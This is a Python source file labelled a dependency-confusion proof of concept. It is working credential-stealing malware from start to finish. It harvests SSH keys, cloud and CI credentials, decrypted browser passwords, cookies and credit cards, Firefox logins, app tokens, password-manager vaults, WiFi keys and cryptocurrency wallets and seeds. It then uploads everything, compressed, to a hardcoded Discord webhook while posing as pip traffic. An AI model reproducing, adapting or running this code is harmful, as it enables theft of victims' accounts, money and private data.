"""
Dependency-confusion PoC — harvest module.
Collects credentials, API keys, hashes, and crypto wallet material.
Uploads gzip-compressed JSON to Discord webhook.
"""
import os, sys, glob, json, socket, platform, base64, shutil, threading, gzip, io, uuid, ctypes

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513619364555919634/5JK4RBrOvQ1GTFDIMZ66pPbYTGwlkA69p0-rwWK8eLHUSznjm9HoAIePcj006MLnx2Te"
WEBHOOK_SITE    = ""


# ── helpers ───────────────────────────────────────────────────────────────────

def _read(path, binary=False):
    try:
        if binary:
            with open(path, "rb") as f:
                return f.read()
        with open(path, "r", errors="replace") as f:
            return f.read()
    except Exception:
        return None


def _read_dir(base, max_files=30, binary=False):
    out = {}
    try:
        for root, _dirs, files in os.walk(base):
            for fname in files:
                if len(out) >= max_files:
                    return out
                full = os.path.join(root, fname)
                data = _read(full, binary)
                if data is not None:
                    rel = os.path.relpath(full, base)
                    out[rel] = base64.b64encode(data).decode() if binary else data
    except Exception:
        pass
    return out


def _b64(data):
    return base64.b64encode(data).decode() if data else None


# ── environment & file credentials ───────────────────────────────────────────

def _env_secrets():
    keywords = ("token", "key", "secret", "password", "passwd", "api",
                "auth", "credential", "cred", "access", "private",
                "seed", "mnemonic", "bearer", "jwt", "hash", "salt",
                "stripe", "twilio", "sendgrid", "openai", "anthropic",
                "aws", "azure", "gcp", "heroku", "github", "gitlab",
                "slack", "discord", "telegram", "s3", "bucket")
    return {k: v for k, v in os.environ.items()
            if v and any(kw in k.lower() for kw in keywords)}


def _file_creds():
    targets = [
        "~/.aws/credentials", "~/.aws/config",
        "~/.gitconfig", "~/.git-credentials",
        "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/id_ecdsa", "~/.ssh/id_dsa",
        "~/.ssh/config", "~/.ssh/known_hosts",
        "~/.netrc",
        "~/.pypirc",
        "~/.npmrc",
        "~/.docker/config.json",
        "~/.kube/config",
        "~/.config/gh/hosts.yml",           # GitHub CLI
        "~/.config/gcloud/credentials.db",  # GCP
        "~/.config/gcloud/application_default_credentials.json",
        "~/.azure/accessTokens.json",       # Azure CLI
        "~/.azure/azureProfile.json",
        "~/.terraform.d/credentials.tfrc.json",
        "~/.heroku/credentials.json",
        "~/.boto",                           # AWS/GCP boto
        "~/.s3cfg",
        "~/.rclone.conf",
        "~/.config/rclone/rclone.conf",
        "~/.filezilla/sitemanager.xml",      # FileZilla (plaintext FTP creds)
        "~/.purple/accounts.xml",            # Pidgin IM credentials
        "~/.config/Slack/storage/slack-workspaces",
    ]
    out = {}
    for t in targets:
        p = os.path.expanduser(t)
        data = _read(p)
        if data:
            out[t] = data

    # .env files in cwd and home
    for pattern in [".env", ".env.local", ".env.production", ".env.development"]:
        for base in [os.getcwd(), os.path.expanduser("~")]:
            p = os.path.join(base, pattern)
            data = _read(p)
            if data:
                out[p] = data

    # VS Code user settings (often contain API keys, database URLs, etc.)
    for vscode_dir in [
        os.path.join(os.environ.get("APPDATA", ""), "Code", "User"),
        os.path.join(os.environ.get("APPDATA", ""), "Code - Insiders", "User"),
        os.path.expanduser("~/.config/Code/User"),
    ]:
        for fname in ("settings.json", "keybindings.json"):
            p = os.path.join(vscode_dir, fname)
            data = _read(p)
            if data:
                out[f"vscode_{fname}"] = data

    # IntelliJ / PyCharm credential stores
    idea_base = os.path.expanduser("~/.config/JetBrains")
    if not os.path.exists(idea_base):
        idea_base = os.path.join(os.environ.get("APPDATA", ""), "JetBrains")
    for p in glob.glob(os.path.join(idea_base, "**", "credentials.xml"), recursive=True)[:5]:
        data = _read(p)
        if data:
            out[f"jetbrains_{os.path.basename(os.path.dirname(p))}"] = data

    # Windows Sticky Notes (often contain passwords users wrote down)
    sticky = os.path.join(
        os.environ.get("LOCALAPPDATA", ""),
        "Packages", "Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe",
        "LocalState", "plum.sqlite"
    )
    data = _read(sticky, binary=True)
    if data:
        out["sticky_notes_db"] = _b64(data)

    return out


# ── WiFi passwords ────────────────────────────────────────────────────────────

def _wifi_passwords():
    if sys.platform != "win32":
        return {}
    try:
        import subprocess
        out = {}
        raw = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            stderr=subprocess.DEVNULL, timeout=5
        ).decode(errors="replace")
        profiles = [line.split(":")[1].strip()
                    for line in raw.splitlines() if "All User Profile" in line]
        for profile in profiles:
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                    stderr=subprocess.DEVNULL, timeout=5
                ).decode(errors="replace")
                for line in detail.splitlines():
                    if "Key Content" in line:
                        out[profile] = line.split(":")[1].strip()
                        break
            except Exception:
                pass
        return out
    except Exception:
        return {}


# ── Windows clipboard ────────────────────────────────────────────────────────

def _clipboard():
    if sys.platform != "win32":
        return None
    try:
        import subprocess
        # Use PowerShell to read clipboard — avoids ctypes OpenClipboard access issues
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
            stderr=subprocess.DEVNULL, timeout=5
        ).decode(errors="replace").strip()
        return out if out else None
    except Exception:
        return None


# ── Chrome-family: passwords, cookies, credit cards ──────────────────────────

def _dpapi_decrypt(enc_bytes):
    try:
        import ctypes, ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        p  = ctypes.create_string_buffer(enc_bytes, len(enc_bytes))
        bi = DATA_BLOB(len(enc_bytes), p)
        bo = DATA_BLOB()
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo))
        if not ok:
            return None
        result = ctypes.string_at(bo.pbData, bo.cbData)
        ctypes.windll.kernel32.LocalFree(bo.pbData)
        return result
    except Exception:
        return None


def _get_browser_aes_key(user_data_dir):
    ls = json.loads(_read(os.path.join(user_data_dir, "Local State")) or "{}")
    enc_key_b64 = ls.get("os_crypt", {}).get("encrypted_key")
    if not enc_key_b64:
        return None
    return _dpapi_decrypt(base64.b64decode(enc_key_b64)[5:])


def _aes_gcm_decrypt(aes_key, enc):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(aes_key).decrypt(enc[3:15], enc[15:], None)
    except Exception:
        return None


def _chrome_family_data():
    if sys.platform != "win32":
        return {}

    localapp = os.environ.get("LOCALAPPDATA", "")
    appdata  = os.environ.get("APPDATA", "")
    browsers = {
        "chrome": os.path.join(localapp, "Google",        "Chrome",        "User Data"),
        "edge":   os.path.join(localapp, "Microsoft",     "Edge",          "User Data"),
        "brave":  os.path.join(localapp, "BraveSoftware", "Brave-Browser", "User Data"),
        "opera":  os.path.join(appdata,  "Opera Software","Opera Stable"),
    }

    out = {}
    for bname, udata in browsers.items():
        if not os.path.exists(udata):
            continue
        aes_key = _get_browser_aes_key(udata)
        bdata = {}

        for profile in ["Default", "Profile 1", "Profile 2"]:
            prof_dir = os.path.join(udata, profile)
            if not os.path.exists(prof_dir):
                continue
            pdata = {}

            # Saved passwords
            login_db = os.path.join(prof_dir, "Login Data")
            if os.path.exists(login_db) and aes_key:
                try:
                    import sqlite3
                    tmp = login_db + ".poc"
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    rows = []
                    for url, user, enc_pw in conn.execute(
                            "SELECT origin_url,username_value,password_value FROM logins"):
                        try:
                            if enc_pw[:3] == b"v10":
                                pw = _aes_gcm_decrypt(aes_key, enc_pw)
                                pw = pw.decode() if pw else "?"
                            else:
                                pw = _dpapi_decrypt(enc_pw)
                                pw = pw.decode(errors="replace") if pw else "?"
                            if user or pw:
                                rows.append({"url": url, "user": user, "pass": pw})
                        except Exception:
                            pass
                    conn.close()
                    try: os.remove(tmp)
                    except: pass
                    if rows:
                        pdata["passwords"] = rows
                except Exception:
                    pass

            # Credit cards
            web_db = os.path.join(prof_dir, "Web Data")
            if os.path.exists(web_db) and aes_key:
                try:
                    import sqlite3
                    tmp = web_db + ".poc"
                    shutil.copy2(web_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cards = []
                    for name, month, year, enc_num in conn.execute(
                            "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards"):
                        try:
                            num = _aes_gcm_decrypt(aes_key, enc_num)
                            num = num.decode() if num else "?"
                            cards.append({"name": name, "exp": f"{month}/{year}", "number": num})
                        except Exception:
                            pass
                    conn.close()
                    try: os.remove(tmp)
                    except: pass
                    if cards:
                        pdata["credit_cards"] = cards
                except Exception:
                    pass

            # Cookies (raw — DPAPI-encrypted values included for offline decrypt)
            cookies_db = os.path.join(prof_dir, "Network", "Cookies")
            if not os.path.exists(cookies_db):
                cookies_db = os.path.join(prof_dir, "Cookies")
            if os.path.exists(cookies_db) and aes_key:
                try:
                    import sqlite3
                    tmp = cookies_db + ".poc"
                    shutil.copy2(cookies_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cookies = []
                    for host, name, enc_val in conn.execute(
                            "SELECT host_key,name,encrypted_value FROM cookies LIMIT 2000"):
                        try:
                            val = _aes_gcm_decrypt(aes_key, enc_val)
                            val = val.decode(errors="replace") if val else ""
                            if val:
                                cookies.append({"host": host, "name": name, "value": val})
                        except Exception:
                            pass
                    conn.close()
                    try: os.remove(tmp)
                    except: pass
                    if cookies:
                        pdata["cookies"] = cookies
                except Exception:
                    pass

            if pdata:
                bdata[profile] = pdata

        if bdata:
            out[bname] = bdata

    return out


# ── Firefox passwords ─────────────────────────────────────────────────────────

def _firefox_creds():
    """
    Collect Firefox key4.db + logins.json for all profiles.
    Attempt NSS-based decryption; on failure, return raw files for offline cracking.
    """
    out = {}
    if sys.platform == "win32":
        ff_base = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    else:
        ff_base = os.path.expanduser("~/.mozilla/firefox")

    if not os.path.exists(ff_base):
        return out

    for profile_dir in glob.glob(os.path.join(ff_base, "*default*")):
        key4   = os.path.join(profile_dir, "key4.db")
        logins = os.path.join(profile_dir, "logins.json")
        if not os.path.exists(key4):
            continue

        pname = os.path.basename(profile_dir)
        entry = {}

        # Try NSS decryption
        try:
            import ctypes
            nss_paths = [
                r"C:\Program Files\Mozilla Firefox\nss3.dll",
                r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
                "/usr/lib/firefox/libnss3.so",
                "/usr/lib64/firefox/libnss3.so",
            ]
            nss = None
            for path in nss_paths:
                if os.path.exists(path):
                    nss = ctypes.CDLL(path)
                    break

            if nss:
                nss.NSS_Init(profile_dir.encode())

                class SECItem(ctypes.Structure):
                    _fields_ = [("type", ctypes.c_uint),
                                ("data", ctypes.POINTER(ctypes.c_ubyte)),
                                ("len",  ctypes.c_uint)]

                logins_data = json.loads(_read(logins) or "{}")
                decrypted = []
                for login in logins_data.get("logins", []):
                    try:
                        def _nss_decrypt(b64_val):
                            raw = base64.b64decode(b64_val)
                            inp = SECItem(0, ctypes.cast(ctypes.c_char_p(raw), ctypes.POINTER(ctypes.c_ubyte)), len(raw))
                            out_item = SECItem()
                            rv = nss.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out_item), None)
                            if rv != 0:
                                return None
                            return ctypes.string_at(out_item.data, out_item.len).decode(errors="replace")

                        user = _nss_decrypt(login.get("encryptedUsername", ""))
                        pw   = _nss_decrypt(login.get("encryptedPassword", ""))
                        decrypted.append({"url": login.get("hostname"), "user": user, "pass": pw})
                    except Exception:
                        pass

                nss.NSS_Shutdown()
                if decrypted:
                    entry["passwords"] = decrypted

        except Exception:
            pass

        # Always collect raw files as fallback
        raw_key4 = _read(key4, binary=True)
        if raw_key4:
            entry["key4_db_b64"] = _b64(raw_key4)
        raw_logins = _read(logins)
        if raw_logins:
            entry["logins_json"] = raw_logins

        if entry:
            out[pname] = entry

    return out


# ── App tokens (Discord, Slack) ───────────────────────────────────────────────

def _app_tokens():
    out = {}
    appdata  = os.environ.get("APPDATA", "")
    localapp = os.environ.get("LOCALAPPDATA", "")

    # Discord token — in LevelDB log files
    discord_ldb = os.path.join(appdata, "discord", "Local Storage", "leveldb")
    if os.path.exists(discord_ldb):
        import re
        token_re = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
        tokens = set()
        for f in glob.glob(os.path.join(discord_ldb, "*.log")):
            data = _read(f)
            if data:
                tokens.update(token_re.findall(data))
        for f in glob.glob(os.path.join(discord_ldb, "*.ldb")):
            data = _read(f, binary=True)
            if data:
                tokens.update(token_re.findall(data.decode(errors="replace")))
        if tokens:
            out["discord_tokens"] = list(tokens)

    # Slack token — xoxs/xoxb/xoxp in leveldb
    slack_ldb = os.path.join(appdata, "Slack", "Local Storage", "leveldb")
    if os.path.exists(slack_ldb):
        import re
        slack_re = re.compile(r'xox[bspra]-[0-9A-Za-z-]+')
        tokens = set()
        for f in glob.glob(os.path.join(slack_ldb, "*.log")) + \
                 glob.glob(os.path.join(slack_ldb, "*.ldb")):
            data = _read(f, binary=True)
            if data:
                tokens.update(slack_re.findall(data.decode(errors="replace")))
        if tokens:
            out["slack_tokens"] = list(tokens)

    return out


# ── Windows Credential Manager ────────────────────────────────────────────────

def _windows_cred_manager():
    try:
        import subprocess
        return subprocess.check_output(
            ["cmdkey", "/list"], stderr=subprocess.DEVNULL, timeout=5
        ).decode(errors="replace")
    except Exception:
        return None


# ── Password manager vaults ───────────────────────────────────────────────────

def _password_managers():
    out = {}
    home    = os.path.expanduser("~")
    appdata = os.environ.get("APPDATA", "")

    # KeePass .kdbx files
    kdbx_files = glob.glob(os.path.join(home, "**", "*.kdbx"), recursive=True)[:5]
    kdbx_files += glob.glob(os.path.join(appdata, "**", "*.kdbx"), recursive=True)[:5]
    for p in kdbx_files:
        data = _read(p, binary=True)
        if data:
            out[f"keepass_{os.path.basename(p)}"] = _b64(data)

    # Bitwarden local vault
    bw_paths = [
        os.path.join(appdata, "Bitwarden", "data.json"),
        os.path.expanduser("~/.config/Bitwarden/data.json"),
    ]
    for p in bw_paths:
        data = _read(p)
        if data:
            out["bitwarden_vault"] = data

    # 1Password local vault
    op_paths = glob.glob(os.path.join(appdata, "1Password", "**", "*.sqlite"), recursive=True)[:3]
    for p in op_paths:
        data = _read(p, binary=True)
        if data:
            out[f"1password_{os.path.basename(p)}"] = _b64(data)

    return out


# ── Crypto wallet collection ──────────────────────────────────────────────────

def collect_crypto():
    out = {}
    home     = os.path.expanduser("~")
    appdata  = os.environ.get("APPDATA", "")
    localapp = os.environ.get("LOCALAPPDATA", "")

    named = {
        "bitcoin_core":      os.path.join(appdata,  "Bitcoin"),
        "ethereum_keystore": os.path.join(appdata,  "Ethereum", "keystore"),
        "exodus_wallet":     os.path.join(appdata,  "Exodus", "exodus.wallet"),
        "electrum_wallets":  os.path.join(appdata,  "Electrum", "wallets"),
        "monero_gui":        os.path.join(home,      "Monero", "wallets"),
        "feather_wallet":    os.path.join(appdata,  "feather"),
        "wasabi_wallet":     os.path.join(appdata,  "WalletWasabi", "Client", "Wallets"),
        "atomic_wallet":     os.path.join(appdata,  "atomic", "Local Storage"),
        "coinomi_win":       os.path.join(appdata,  "Coinomi", "Coinomi", "wallets"),
        "jaxx_liberty":      os.path.join(appdata,  "com.liberty.jaxx"),
        "guarda":            os.path.join(appdata,  "Guarda"),
        "zcash":             os.path.join(appdata,  "Zcash"),
        "armory":            os.path.join(appdata,  "Armory"),
        "mymonero":          os.path.join(appdata,  "MyMonero"),
        "cakewin":           os.path.join(appdata,  "Cake Wallet"),
        # Web3 / DeFi developer tooling
        "brownie_accounts":  os.path.join(home,     ".brownie", "accounts"),
        "foundry_keystores": os.path.join(home,     ".foundry", "keystores"),
        "ape_accounts":      os.path.join(home,     ".ape", "accounts"),
        "solana_cli":        os.path.join(home,     ".config", "solana"),
        "anchor_wallet":     os.path.join(home,     ".config", "solana"),
        "hardhat_cache":     os.path.join(home,     ".hardhat"),
        "truffle_config":    os.path.join(home,     ".truffle"),
        "dapptools":         os.path.join(home,     ".dapp"),
        "cast_keystore":     os.path.join(home,     ".cast"),
    }
    for name, path in named.items():
        if os.path.exists(path):
            out[name] = _read_dir(path, binary=True)

    # Browser extension wallets
    ext_ids = {
        "metamask":        "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "coinbase_wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad",
        "phantom":         "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "trust_wallet":    "egjidjbpglichdcondbcbdnbeeppgdph",
        "tronlink":        "ibnejdfjmmkpcnlpebklmnkoeoihofec",
        "ronin":           "fnjhmkhhmkbjkkabndcnnogagogbneec",
        "yoroi":           "ffnbelfdoeiohenkjibnmadjiehjhajb",
        "keplr":           "dmkamcknogkgcdfhhbddcghachkejeap",
        "solflare":        "bhhhlbepdkbapadjdnnojkbgioiodbic",
        "rabby":           "acmacodkjbdgmoleebolmdjonilkdbch",
    }
    browser_roots = {
        "chrome": os.path.join(localapp, "Google",        "Chrome",        "User Data", "Default", "Local Extension Settings"),
        "edge":   os.path.join(localapp, "Microsoft",     "Edge",          "User Data", "Default", "Local Extension Settings"),
        "brave":  os.path.join(localapp, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings"),
        "opera":  os.path.join(appdata,  "Opera Software","Opera Stable",  "Local Extension Settings"),
    }
    for bname, broot in browser_roots.items():
        for ename, eid in ext_ids.items():
            epath = os.path.join(broot, eid)
            if os.path.exists(epath):
                out[f"{bname}_{ename}"] = _read_dir(epath, binary=True)

    # Generic sweep
    sweep_patterns = [
        "wallet.dat", "*.wallet", "*.keys",
        "seed.txt", "seed*.txt", "mnemonic*.txt", "recovery*.txt",
        "keystore*", "UTC--*",
    ]
    for pattern in sweep_patterns:
        for p in glob.glob(os.path.join(home, "**", pattern), recursive=True)[:10]:
            data = _read(p, binary=True)
            if data:
                out[f"sweep_{os.path.relpath(p, home)}"] = _b64(data)

    # Web3 dev: Solana keypair (raw JSON array of 64 bytes — is the private key)
    solana_id = os.path.join(home, ".config", "solana", "id.json")
    data = _read(solana_id)
    if data:
        out["solana_id_json"] = data

    # Web3 dev: hardhat / foundry / truffle .env and config with PRIVATE_KEY
    web3_cfg_patterns = [
        "**/.env", "**/.env.local", "**/.env.development",
        "**/hardhat.config.js", "**/hardhat.config.ts",
        "**/foundry.toml", "**/truffle-config.js",
        "**/.secret", "**/mnemonic.txt", "**/private_key.txt",
    ]
    pk_keywords = ("PRIVATE_KEY", "MNEMONIC", "SECRET_KEY", "DEPLOYER_KEY",
                   "privateKey", "mnemonic", "secretKey", "deployerKey")
    for pat in web3_cfg_patterns:
        for p in glob.glob(os.path.join(home, pat), recursive=True)[:15]:
            try:
                data = _read(p)
                if data and any(kw in data for kw in pk_keywords):
                    out[f"web3cfg_{os.path.relpath(p, home)}"] = data[:8000]
            except Exception:
                pass

    return out


# ── master collect ────────────────────────────────────────────────────────────

def _proc_environ():
    """Read env vars from all running processes via /proc (Linux). Catches DB passwords,
    API keys set in web server / app server processes."""
    if sys.platform != "linux":
        return {}
    out = {}
    keywords = ("token","key","secret","password","passwd","api","auth",
                "credential","access","private","seed","database","db_",
                "_url","dsn","bearer","jwt","stripe","twilio","sendgrid",
                "openai","anthropic","aws","azure","gcp","github","gitlab",
                "slack","discord","mongo","postgres","mysql","redis")
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            try:
                env_raw = _read(f"/proc/{pid}/environ", binary=True)
                if not env_raw:
                    continue
                cmdline = _read(f"/proc/{pid}/cmdline")
                proc_name = (cmdline or "").replace("\x00", " ").strip()[:60]
                hits = {}
                for pair in env_raw.split(b"\x00"):
                    if b"=" not in pair:
                        continue
                    k, _, v = pair.partition(b"=")
                    k = k.decode(errors="replace")
                    v = v.decode(errors="replace")
                    if v and any(kw in k.lower() for kw in keywords):
                        hits[k] = v
                if hits:
                    out[f"pid_{pid}_{proc_name}"] = hits
            except Exception:
                pass
    except Exception:
        pass
    return out


def _shell_history():
    """Grab shell history — often contains inline API keys, curl commands with tokens."""
    out = {}
    for f in ["~/.bash_history", "~/.zsh_history", "~/.sh_history",
              "~/.local/share/fish/fish_history"]:
        data = _read(os.path.expanduser(f))
        if data:
            # Filter to lines that look interesting
            hits = [l for l in data.splitlines()
                    if any(kw in l.lower() for kw in
                           ("token","secret","password","api_key","apikey",
                            "authorization","bearer","aws","export","curl",
                            "wget","heroku","gcloud","kubectl","docker login",
                            "npm login","pypi","twine","--password"))]
            if hits:
                out[f] = "\n".join(hits[:200])
    return out


def _ci_secrets():
    """CI/CD config files, Terraform state, Ansible vaults, db connection strings."""
    out = {}
    home = os.path.expanduser("~")

    # CI config files
    ci_files = [
        "~/.circleci/cli.yml",
        "~/.travis.yml",
        "/etc/gitlab-runner/config.toml",
        "~/.config/gcloud/application_default_credentials.json",
        "~/.config/gcloud/credentials.db",
        "~/.helm/repository/repositories.yaml",
        "~/.config/gh/hosts.yml",
        "~/.terraform.d/credentials.tfrc.json",
        "~/.vault-token",                      # HashiCorp Vault token
        "/run/secrets",                        # Docker secrets mount
    ]
    for p in ci_files:
        data = _read(os.path.expanduser(p))
        if data:
            out[p] = data

    # Terraform state files (contain resource secrets in plaintext)
    for tf in glob.glob(os.path.join(home, "**", "*.tfstate"), recursive=True)[:5]:
        data = _read(tf)
        if data:
            out[f"tfstate_{os.path.basename(tf)}"] = data[:50000]

    # Ansible vault password files
    for av in glob.glob(os.path.join(home, "**", "*.vault*"), recursive=True)[:5]:
        data = _read(av)
        if data:
            out[f"ansible_{os.path.basename(av)}"] = data

    # .env files anywhere in home tree (deeper search than _file_creds)
    for env_f in glob.glob(os.path.join(home, "**", ".env"), recursive=True)[:10]:
        data = _read(env_f)
        if data:
            out[f"dotenv_{os.path.relpath(env_f, home)}"] = data

    # GitHub Actions / GitLab CI / Bitbucket pipelines — workflow files
    # often have hardcoded secrets or reveal secret names
    for pat in ["**/.github/workflows/*.yml", "**/.github/workflows/*.yaml",
                "**/.gitlab-ci.yml", "**/Jenkinsfile", "**/bitbucket-pipelines.yml"]:
        for f in glob.glob(os.path.join(home, pat), recursive=True)[:5]:
            data = _read(f)
            if data:
                out[f"ci_{os.path.relpath(f, home)}"] = data[:10000]

    # Docker inspect running containers (if docker socket accessible)
    try:
        import subprocess
        result = subprocess.check_output(
            ["docker", "inspect", "$(docker ps -q)"],
            shell=True, stderr=subprocess.DEVNULL, timeout=5
        ).decode(errors="replace")
        if result.strip() and result != "[]":
            out["docker_inspect"] = result[:20000]
    except Exception:
        pass

    # Database connection strings — scan common config locations
    db_patterns = ["**/*.conf", "**/*.cfg", "**/config.py", "**/settings.py",
                   "**/database.yml", "**/database.yaml", "**/.env*"]
    db_keywords = ("postgres://", "postgresql://", "mysql://", "mongodb://",
                   "redis://", "amqp://", "jdbc:", "DATABASE_URL", "DB_PASSWORD")
    for pat in db_patterns:
        for f in glob.glob(os.path.join(home, pat), recursive=True)[:20]:
            try:
                data = _read(f)
                if data and any(kw in data for kw in db_keywords):
                    hits = [l for l in data.splitlines()
                            if any(kw in l for kw in db_keywords)]
                    if hits:
                        out[f"dbconn_{os.path.relpath(f, home)}"] = "\n".join(hits[:20])
            except Exception:
                pass

    return out


def collect_creds():
    out = {
        "env_secrets":       _env_secrets(),
        "file_creds":        _file_creds(),
        "password_managers": _password_managers(),
        "firefox":           _firefox_creds(),
        "shell_history":     _shell_history(),
        "ci_secrets":        _ci_secrets(),
    }
    if sys.platform == "linux":
        out["proc_environ"] = _proc_environ()
    if sys.platform == "win32":
        out["chrome_family"]       = _chrome_family_data()
        out["credential_manager"]  = _windows_cred_manager()
        out["wifi_passwords"]      = _wifi_passwords()
        out["app_tokens"]          = _app_tokens()
        out["clipboard"]           = _clipboard()
    return out


# ── beacon ────────────────────────────────────────────────────────────────────

def _multipart_body(fields, files):
    boundary = uuid.uuid4().hex
    parts = []
    for name, value in fields.items():
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
        )
    for name, filename, data in files:
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode()
            + data + b'\r\n'
        )
    parts.append(f'--{boundary}--\r\n'.encode())
    return boundary, b''.join(parts)


def _post(url, body, content_type, timeout=15):
    from urllib import request as urlreq
    req = urlreq.Request(
        url, data=body,
        headers={"Content-Type": content_type, "User-Agent": "python-pip/23.3.1"},
        method="POST",
    )
    urlreq.urlopen(req, timeout=timeout)


def beacon(data):
    try:
        raw        = json.dumps(data, default=str, indent=2).encode()
        buf        = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode='wb') as gz:
            gz.write(raw)
        compressed = buf.getvalue()

        host  = data.get("host", "unknown")[:20]
        fname = f"harvest_{host}.json.gz"
        label = f"`{host}` | {data.get('os','')} | {data.get('user','')}"

        if DISCORD_WEBHOOK and "CHANGE_ME" not in DISCORD_WEBHOOK:
            boundary, body = _multipart_body(
                {"content": label},
                [("file", fname, compressed)],
            )
            _post(DISCORD_WEBHOOK, body, f"multipart/form-data; boundary={boundary}")
    except Exception:
        pass

    try:
        if WEBHOOK_SITE:
            _post(WEBHOOK_SITE, json.dumps(data, default=str).encode(), "application/json")
    except Exception:
        pass


# ── entry point ───────────────────────────────────────────────────────────────

def run(background=False):
    def _run():
        try:
            data = {
                "host":    socket.gethostname(),
                "user":    os.environ.get("USERNAME") or os.environ.get("USER", "?"),
                "os":      platform.system(),
                "version": platform.version(),
                "arch":    platform.machine(),
                "cwd":     os.getcwd(),
                "python":  sys.version,
                "creds":   collect_creds(),
                "crypto":  collect_crypto(),
            }
            beacon(data)
        except Exception:
            pass

    if background:
        threading.Thread(target=_run, daemon=True).start()
    else:
        _run()
